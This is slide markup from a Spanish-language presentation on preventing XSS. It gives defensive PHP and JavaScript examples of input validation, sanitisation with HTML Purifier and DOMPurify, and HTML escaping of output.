            <a:endParaRPr lang="es-ES" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>text.replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>(/[&amp;&lt;&gt;"']/g, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>(m) { </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>map</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>[m]; });</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t> nombre = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>escapeHtml</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>('nombre').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20646998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04015" y="90581"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – Controles de entrada</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CuadroTexto 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{180D82DD-04A5-0C7A-DB3B-E5CC27B3AB72}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304014" y="1014720"/>
            <a:ext cx="11536051" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0"/>
              <a:t>Validación de entrada</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>: Asegúrese de que los datos enviados por el usuario cumplan con ciertos requisitos antes de procesarlos. Por ejemplo, si se espera que el usuario ingrese una dirección de correo electrónico, puede verificar que el valor ingresado contenga el símbolo @ y un dominio válido</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="CuadroTexto 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71670F96-CFE3-5D46-6EA2-67449E0A8EC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304014" y="1938050"/>
            <a:ext cx="6094428" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES"/>
              <a:t>Ejemplo en PHP:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="CuadroTexto 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9738FCF6-0355-567F-151D-99368952984F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2877533" y="1938050"/>
            <a:ext cx="5144677" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>$email = $_POST['email'];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>filter_var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($email, FILTER_VALIDATE_EMAIL)) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  // correo electrónico válido</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>else</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  // correo electrónico no válido</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="CuadroTexto 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D2E70CFA-B74D-3D18-C345-10A16322D7CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304014" y="3834055"/>
            <a:ext cx="6094428" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en JavaScript:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="CuadroTexto 17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC473A34-1993-CA29-5AC3-2A535BFAC21D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2877533" y="3951667"/>
            <a:ext cx="6096000" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> email = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('email').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>if</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  // correo electrónico válido</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>} </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>else</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>  // correo electrónico no válido</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4274664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459966" y="81154"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – Controles de entrada</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="CuadroTexto 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F8AF87E-E342-9BCC-F9BF-FD40FEFD3C9F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459966" y="863791"/>
            <a:ext cx="11272068" cy="923330"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0"/>
              <a:t>Sanitización de entrada</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>: Si está permitiendo que los usuarios ingresen datos enriquecidos, como HTML o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>BBCode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>, es importante limpiar y validar estos datos antes de mostrarlos en su sitio. Puede hacer esto utilizando una biblioteca como HTML </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>Purifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> en PHP o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> en JavaScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="CuadroTexto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A4CDE82C-0F93-CDE6-3170-EC02CD9F49C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459966" y="1923427"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en PHP:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="CuadroTexto 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{34DE50CB-2404-6BAE-A9C8-A422D097C53B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971800" y="2042823"/>
            <a:ext cx="6096000" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>require_once</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> '/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>HTMLPurifier.auto.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>HTMLPurifier_Config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>createDefault</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>purifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>HTMLPurifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>$contenido = $_POST['contenido'];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>contenido_limpio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>purifier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>purify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($contenido);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="CuadroTexto 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20B29280-4CCF-F528-5E62-FBB7FE60D3B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459966" y="4061771"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Ejemplo en JavaScript:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="CuadroTexto 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52AC6D94-4F89-8115-60E1-F90F2B0FFCCC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971800" y="4205292"/>
            <a:ext cx="6096000" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> contenido = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>('contenido').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>contenido_limpio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>.sanitize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>(contenido);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25607831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235631" y="198091"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Prevención XSS – Codificar datos de salida</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="CuadroTexto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8A85453-4873-CE0B-AF07-EDAD74205842}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="424543" y="980728"/>
            <a:ext cx="10874828" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" b="1" dirty="0"/>
              <a:t>Escapar caracteres especiales</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>: Al igual que con la validación de entrada, escapar caracteres especiales en la salida es una forma efectiva de prevenir ataques XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="CuadroTexto 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{56D62115-2937-ADE9-866A-68E77C58BE2E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="424543" y="1763365"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES"/>
              <a:t>Ejemplo en PHP</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="CuadroTexto 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{431B371B-AAAB-26B8-DA00-6036808F61C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2813957" y="1763365"/>
            <a:ext cx="6096000" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>echo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>($contenido);</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="CuadroTexto 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0E50EE7F-481C-1812-7BEE-0832BEF6EBD9}"/>
              </a:ext>
            </a:extLst>
